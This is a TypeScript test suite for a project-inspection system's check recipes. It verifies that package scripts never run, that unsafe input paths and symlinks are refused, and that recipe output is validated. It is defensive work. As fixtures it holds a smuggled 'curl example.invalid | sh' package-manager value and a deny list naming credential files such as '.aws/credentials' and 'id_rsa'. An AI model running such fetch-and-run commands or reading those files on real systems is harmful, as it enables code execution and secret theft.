import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { execFile, execFileSync } from 'node:child_process';
import { promisify } from 'node:util';
import { createHash } from 'node:crypto';
import {
  CheckRecipeCatalog,
  type CheckRecipeContribution,
  type CheckRecipeProposal,
} from '../core/check-recipes.ts';
import { captureCheckRecipeFacts } from '../adapters/discovery/check-recipes/manifest-facts.ts';
import { FileProjectRepository } from '../adapters/files/project-manager.ts';
import { createBuiltinCheckRecipes } from '../adapters/discovery/check-recipes/builtins.ts';
import { createHost } from '../plugins/host.ts';
import { projectManagementPlugin } from '../plugins/project-management.ts';
import { GitWorkspaces } from '../adapters/files/git-workspaces.ts';
import type { RepositoryInfo } from '../protocol/domain.ts';

const execute = promisify(execFile);
const command = (id: string) => ({ id, title: id, command: 'node ' + id + '.js', timeoutMs: 1000 });
const empty = (): CheckRecipeProposal => ({
  checks: [],
  defaultCheckIds: [],
  setup: [],
  warnings: [],
});
function recipe(id: string, propose: CheckRecipeContribution['propose']): CheckRecipeContribution {
  return { id, revision: 'fixture-v1', label: id, inputs: [], propose };
}
const facts = (ids: string[]) =>
  new Map(ids.map((id) => [id, { head: 'fixture-head', entries: [] }]));
async function directory(t: { after(fn: () => Promise<unknown>): void }) {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'buro-check-recipes-')));
  t.after(() => fs.rm(root, { recursive: true, force: true }));
  return root;
}
async function repository(
  t: { after(fn: () => Promise<unknown>): void },
  files: Record<string, string>,
) {
  const root = await directory(t);
  for (const [file, content] of Object.entries(files))
    await fs.writeFile(path.join(root, file), content);
  const git = (...args: string[]) =>
    execute(
      'git',
      [
        '-c',
        'core.hooksPath=/dev/null',
        '-c',
        'commit.gpgsign=false',
        '-c',
        'user.name=Fixture',
        '-c',
        'user.email=fixture@example.invalid',
        ...args,
      ],
      { cwd: root },
    );
  await git('init');
  await git('add', '.');
  await git('commit', '--allow-empty', '-m', 'fixture');
  return { root, git };
}

test('Node inspection uses the registered recipe with actual hashes and never runs package scripts', async (t) => {
  const marker = 'must-not-execute';
  const manifest = JSON.stringify({
    name: 'Recipe project',
    packageManager: 'pnpm@10.0.0',
    scripts: {
      test: `touch ${marker}`,
      typecheck: 'tsc',
      lint: 'eslint',
      prepare: 'touch also-not-executed',
    },
  });
  const { root } = await repository(t, {
    'package.json': manifest,
    'pnpm-lock.yaml': 'lockfileVersion: 9',
  });
  await fs.mkdir(path.join(root, 'node_modules'));
  const info = await new FileProjectRepository().inspect(root);
  assert.equal(info.name, 'Recipe project');
  assert.deepEqual(
    info.profile.checks.map((check) => check.command),
    ['pnpm run test', 'pnpm run typecheck', 'pnpm run lint'],
  );
  assert.deepEqual(info.profile.defaultCheckIds, ['test']);
  assert.deepEqual(info.profile.setup, []);
  assert.equal(info.profile.dependencies, 'link-node-modules');
  assert.equal(info.checkRecipes?.[0].contributionId, 'node');
  assert.equal(
    info.checkRecipes?.[0].inputs.find((input) => input.path === 'package.json')?.digest,
    createHash('sha256').update(manifest).digest('hex'),
  );
  assert.equal(
    info.checkRecipes?.[0].inputs.find((input) => input.path === 'pnpm-lock.yaml')?.digest,
    undefined,
  );
  assert.equal(
    JSON.stringify(info.checkRecipes).includes('touch'),
    false,
    'Public provenance never includes private manifest content.',
  );
  await assert.rejects(fs.stat(path.join(root, marker)), { code: 'ENOENT' });
});

test('a third non-Node recipe changes real Cordis project.inspect output without calling a model, workspace or check executor', async (t) => {
  const manifest = JSON.stringify({
    check: 'node verify-forge.js',
    setup: 'node bootstrap-forge.js',
  });
  const { root } = await repository(t, {
    'forge.json': manifest,
    'verify-forge.js': 'throw Error("Do not execute inspection");',
    'bootstrap-forge.js': 'throw Error("Do not execute inspection");',
  });
  let proposals = 0,
    executions = 0;
  const host = await createHost({
    configure: async (ctx) => {
      await ctx.plugin({
        name: 'forge-recipe-fixture',
        inject: ['projectContributions'],
        apply(ctx) {
          ctx.projectContributions.checkRecipes.register({
            id: 'forge',
            revision: 'forge-v1',
            label: 'Forge checks',
            inputs: [
              { path: 'forge.json', kind: 'text' },
              { path: 'verify-forge.js', kind: 'file' },
              { path: 'bootstrap-forge.js', kind: 'file' },
            ],
            propose(facts) {
              proposals++;
              assert.deepEqual(
                facts.entries.map((entry) => entry.path),
                ['forge.json', 'verify-forge.js', 'bootstrap-forge.js'],
              );
              assert.deepEqual(Object.keys(facts).sort(), ['entries', 'head']);
              const entry = facts.entries[0];
              assert.equal(entry.kind, 'text');
              if (entry.kind !== 'text' || !entry.exists) return undefined;
              const data = JSON.parse(entry.content);
              return {
                projectName: 'Forge project',
                checks: [{ ...command('forge-check'), command: data.check }],
                defaultCheckIds: ['forge-check'],
                setup: [{ ...command('forge-bootstrap'), command: data.setup }],
                warnings: [],
                environmentRecipe: {
                  summary: 'Forge readiness',
                  inputs: ['forge.json'],
                  setup: [],
                  ready: [{ ...command('forge-ready'), command: data.check }],
                },
              };
            },
          });
        },
      });
    },
  });
  t.after(() => host.dispose());
  await host.ctx.plugin(projectManagementPlugin, {
    catalogFile: path.join(root, 'catalog.json'),
    policies: {},
    workspaces: new GitWorkspaces(host.ctx.projects.registry),
    checks: {
      async run() {
        executions++;
        throw Error('No checks during inspect');
      },
    },
  });
  const info = (await host.ctx.commands.bus.execute(
    { method: 'project.inspect', params: { root } },
    { id: 'inspect-forge', fingerprint: 'inspect-forge' },
  )) as RepositoryInfo;
  assert.equal(info.name, 'Forge project');
  assert.equal(info.profile.checks[0].command, 'node verify-forge.js');
  assert.equal(info.profile.setup[0].command, 'node bootstrap-forge.js');
  assert.equal(info.profile.environment?.provider, 'native', 'Recipes cannot select an executor.');
  assert.equal(info.profile.environment?.recipe?.ready[0].id, 'forge-ready');
  assert.deepEqual(
    info.checkRecipes?.map((source) => source.contributionId),
    ['forge'],
  );
  assert.equal(
    info.checkRecipes?.[0].inputs[0].digest,
    createHash('sha256').update(manifest).digest('hex'),
  );
  assert.equal(proposals, 1);
  assert.equal(executions, 0);
  assert.equal(
    host.ctx.projects.registry.list().length,
    0,
    'Inspection does not connect or seed a project.',
  );
  assert.throws(() => host.ctx.projectContributions.checkRecipes.register(recipe('late', empty)), {
    code: 'CHECK_RECIPES_SEALED',
  });
});

test('stored manual profiles win without invoking recipes or touching their unrelated unsafe inputs', async (t) => {
  const { root } = await repository(t, {
    'package.json': JSON.stringify({ scripts: { test: 'node automatic.js' } }),
  });
  const initial = await new FileProjectRepository().inspect(root);
  const manual = {
    ...initial.profile,
    checks: [command('manual')],
    defaultCheckIds: ['manual'],
    setup: [command('manual-setup')],
    dependencies: 'none' as const,
  };
  await fs.mkdir(path.join(root, '.buro'));
  await fs.writeFile(
    path.join(root, '.buro/project.json'),
    JSON.stringify({ version: 1, id: 'manual', name: 'Manual project', profile: manual }),
  );
  await fs.symlink(path.join(root, 'package.json'), path.join(root, 'unrelated.json'));
  let calls = 0;
  const catalog = new CheckRecipeCatalog();
  catalog.register({
    ...recipe('unused', () => {
      calls++;
      throw Error('Must not replace manual settings');
    }),
    inputs: [{ path: 'unrelated.json', kind: 'text' }],
  });
  catalog.seal();
  const inspected = await new FileProjectRepository(catalog).inspect(root);
  assert.deepEqual(inspected.profile, manual);
  assert.equal(inspected.name, 'Manual project');
  assert.equal(calls, 0);
  assert.deepEqual(inspected.checkRecipes, []);
});

test('unsafe declarations are rejected before capture and text symlinks never reach recipe callbacks', async (t) => {
  for (const name of [
    '../secret.json',
    '/tmp/secret.json',
    '.env',
    '.env.local',
    '.buro/private.json',
    '.git/config',
    '.aws/credentials',
    'nested/id_rsa',
    'node_modules/pkg.json',
    '*.json',
    'a\\b.json',
  ]) {
    const catalog = new CheckRecipeCatalog();
    assert.throws(
      () => catalog.register({ ...recipe('bad', empty), inputs: [{ path: name, kind: 'text' }] }),
      { code: 'INVALID_RECIPE_INPUT' },
    );
  }
  const root = await directory(t),
    outside = await directory(t);
  await fs.writeFile(path.join(outside, 'secret.json'), 'PRIVATE_RECIPE_FIXTURE');
  await fs.symlink(path.join(outside, 'secret.json'), path.join(root, 'manifest.json'));
  let calls = 0;
  const catalog = new CheckRecipeCatalog();
  catalog.register({
    ...recipe('manifest', () => {
      calls++;
      return empty();
    }),
    inputs: [{ path: 'manifest.json', kind: 'text' }],
  });
  catalog.seal();
  await assert.rejects(captureCheckRecipeFacts(root, 'head', catalog), {
    code: 'UNSAFE_RECIPE_INPUT',
  });
  assert.equal(calls, 0);
  await fs.unlink(path.join(root, 'manifest.json'));
  await fs.symlink(outside, path.join(root, 'nested'));
  const ancestor = new CheckRecipeCatalog();
  ancestor.register({
    ...recipe('nested', empty),
    inputs: [{ path: 'nested/secret.json', kind: 'text' }],
  });
  ancestor.seal();
  await assert.rejects(captureCheckRecipeFacts(root, 'head', ancestor), {
    code: 'UNSAFE_RECIPE_INPUT',
  });
});

test('directory facts do not traverse contents, text is bounded and .env.example remains readable', async (t) => {
  const root = await directory(t);
  await fs.mkdir(path.join(root, 'node_modules'));
  await fs.symlink(root, path.join(root, 'node_modules', 'loop'));
  await fs.writeFile(path.join(root, '.env.example'), 'EXAMPLE=public');
  const catalog = new CheckRecipeCatalog();
  catalog.register({
    ...recipe('metadata', empty),
    inputs: [
      { path: 'node_modules', kind: 'directory' },
      { path: '.env.example', kind: 'text' },
    ],
  });
  catalog.seal();
  const captured = await captureCheckRecipeFacts(root, 'head', catalog);
  assert.deepEqual(captured.get('metadata')?.entries[0], {
    path: 'node_modules',
    kind: 'directory',
    exists: true,
  });
  assert.equal(captured.get('metadata')?.entries.length, 2);
  await fs.writeFile(path.join(root, '.env.example'), Buffer.alloc(262145, 65));
  await assert.rejects(captureCheckRecipeFacts(root, 'head', catalog), {
    code: 'RECIPE_INPUT_LIMIT',
  });
  await fs.writeFile(path.join(root, '.env.example'), Buffer.from([65, 0, 66]));
  await assert.rejects(captureCheckRecipeFacts(root, 'head', catalog), {
    code: 'INVALID_RECIPE_MANIFEST',
  });
});

test('callbacks receive frozen declared subsets, cannot invent source evidence, and outputs are validated', async (t) => {
  const root = await directory(t);
  await fs.writeFile(path.join(root, 'one.json'), 'ONE');
  await fs.writeFile(path.join(root, 'two.json'), 'TWO');
  const catalog = new CheckRecipeCatalog();
  for (const [id, file] of [
    ['one', 'one.json'],
    ['two', 'two.json'],
  ])
    catalog.register({
      ...recipe(id, (facts) => {
        assert.deepEqual(
          facts.entries.map((entry) => entry.path),
          [file],
        );
        assert.equal('read' in facts, false);
        assert.equal('execute' in facts, false);
        assert.throws(() => {
          (facts.entries as unknown[]).push({});
        }, TypeError);
        return { ...empty(), checks: [command(id)], defaultCheckIds: [id] };
      }),
      inputs: [{ path: file, kind: 'text' }],
    });
  catalog.seal();
  const result = catalog.discover(await captureCheckRecipeFacts(root, 'head', catalog));
  assert.deepEqual(
    result.sources.map((source) => source.inputs.map((input) => input.path)),
    [['one.json'], ['two.json']],
  );
  for (const proposal of [
    { ...empty(), defaultCheckIds: ['invented'] },
    { ...empty(), checks: [{ ...command('bad'), timeoutMs: 0 }] },
    { ...empty(), sources: [{ digest: 'invented' }] },
    {
      ...empty(),
      environmentRecipe: {
        summary: 'Invalid roots',
        inputs: ['package.json'],
        setup: [],
        ready: [command('ready')],
        variables: { HOME: '/outside' },
      },
    },
  ]) {
    const invalid = new CheckRecipeCatalog();
    invalid.register(recipe('invalid', () => proposal as CheckRecipeProposal));
    invalid.seal();
    assert.throws(() => invalid.discover(facts(['invalid'])), { code: 'INVALID_CHECK_RECIPE' });
  }
});

test('conflicting proposals fail explicitly regardless of registration order; distinct proposals have stable order', () => {
  for (const order of [
    ['a', 'b'],
    ['b', 'a'],
  ]) {
    const conflict = new CheckRecipeCatalog();
    for (const id of order)
      conflict.register(
        recipe(id, () => ({ ...empty(), checks: [command('same')], defaultCheckIds: ['same'] })),
      );
    conflict.seal();
    assert.throws(() => conflict.discover(facts(order)), { code: 'CHECK_RECIPE_CONFLICT' });
    const names = new CheckRecipeCatalog();
    for (const id of order) names.register(recipe(id, () => ({ ...empty(), projectName: id })));
    names.seal();
    assert.throws(() => names.discover(facts(order)), { code: 'CHECK_RECIPE_CONFLICT' });
    const valid = new CheckRecipeCatalog();
    for (const id of order)
      valid.register(
        recipe(id, () => ({ ...empty(), checks: [command(id)], defaultCheckIds: [id] })),
      );
    valid.seal();
    assert.deepEqual(
      valid.discover(facts(order)).checks.map((check) => check.id),
      ['a', 'b'],
    );
  }
});

test('startup registration is captured, sealed and cannot retarget a declared manifest after admission', async (t) => {
  const root = await directory(t);
  await fs.writeFile(path.join(root, 'manifest.json'), '{}');
  const catalog = new CheckRecipeCatalog();
  await assert.rejects(captureCheckRecipeFacts('/missing-before-filesystem', 'head', catalog), {
    code: 'CHECK_RECIPES_UNSEALED',
  });
  assert.throws(() => catalog.register({ ...recipe('invalid', empty), id: undefined } as never), {
    code: 'INVALID_CHECK_RECIPE',
  });
  const input = { path: 'manifest.json', kind: 'text' as const };
  const contribution = { ...recipe('captured', empty), inputs: [input] };
  catalog.register(contribution);
  input.path = '.env';
  contribution.propose = () => {
    throw Error('Replaced callback must not run');
  };
  assert.throws(() => catalog.register(recipe('captured', empty)), { code: 'CHECK_RECIPE_EXISTS' });
  catalog.seal();
  assert.throws(() => catalog.register(recipe('new', empty)), { code: 'CHECK_RECIPES_SEALED' });
  const discovery = catalog.discover(await captureCheckRecipeFacts(root, 'head', catalog));
  assert.equal(discovery.sources[0].inputs[0].path, 'manifest.json');
});

test('undeclared, duplicate or mismatched-head facts are rejected before a callback can use them', () => {
  let calls = 0;
  const catalog = new CheckRecipeCatalog();
  catalog.register({
    ...recipe('first', () => {
      calls++;
      return empty();
    }),
    inputs: [{ path: 'first.json', kind: 'file' }],
  });
  catalog.seal();
  for (const entries of [
    [{ path: 'other.json', kind: 'file', exists: true }],
    [
      { path: 'first.json', kind: 'file', exists: true },
      { path: 'first.json', kind: 'file', exists: true },
    ],
  ])
    assert.throws(
      () => catalog.discover(new Map([['first', { head: 'head', entries }]]) as never),
      { code: 'INVALID_RECIPE_FACTS' },
    );
  assert.equal(calls, 0);
  const mixed = new CheckRecipeCatalog();
  mixed.register(recipe('a', empty));
  mixed.register(recipe('b', empty));
  mixed.seal();
  assert.throws(
    () =>
      mixed.discover(
        new Map([
          ['a', { head: 'old', entries: [] }],
          ['b', { head: 'new', entries: [] }],
        ]),
      ),
    { code: 'INVALID_RECIPE_FACTS' },
  );
});

test('a package manager cannot become an arbitrary shell prefix and missing checks are explicit', async (t) => {
  const { root } = await repository(t, {
    'package.json': JSON.stringify({
      packageManager: 'curl example.invalid | sh',
      scripts: { test: 'node test.js' },
    }),
  });
  const info = await new FileProjectRepository(createBuiltinCheckRecipes()).inspect(root);
  assert.deepEqual(info.profile.checks, []);
  assert.deepEqual(info.profile.defaultCheckIds, []);
  assert.ok(info.warnings.some((warning) => warning.includes('package manager is not supported')));
  assert.ok(info.warnings.some((warning) => warning.includes('No check commands were found')));
});

test('a commit during recipe discovery cannot publish facts under an earlier source HEAD', async (t) => {
  const { root, git } = await repository(t, { 'manifest.json': '{"check":"node check.js"}' });
  const before = (await git('rev-parse', 'HEAD')).stdout.trim();
  const catalog = new CheckRecipeCatalog();
  let called = 0;
  catalog.register({
    ...recipe('concurrent-commit', () => {
      called++;
      // Deterministic phase hook simulates another process advancing this temporary repository.
      execFileSync(
        'git',
        [
          '-c',
          'core.hooksPath=/dev/null',
          '-c',
          'commit.gpgsign=false',
          '-c',
          'user.name=Fixture',
          '-c',
          'user.email=fixture@example.invalid',
          'commit',
          '--allow-empty',
          '-m',
          'concurrent source commit',
        ],
        { cwd: root, stdio: 'ignore' },
      );
      return { ...empty(), checks: [command('check')], defaultCheckIds: ['check'] };
    }),
    inputs: [{ path: 'manifest.json', kind: 'text' }],
  });
  catalog.seal();
  await assert.rejects(new FileProjectRepository(catalog).inspect(root), {
    code: 'REPOSITORY_CHANGED',
  });
  assert.equal(called, 1);
  assert.notEqual((await git('rev-parse', 'HEAD')).stdout.trim(), before);
});
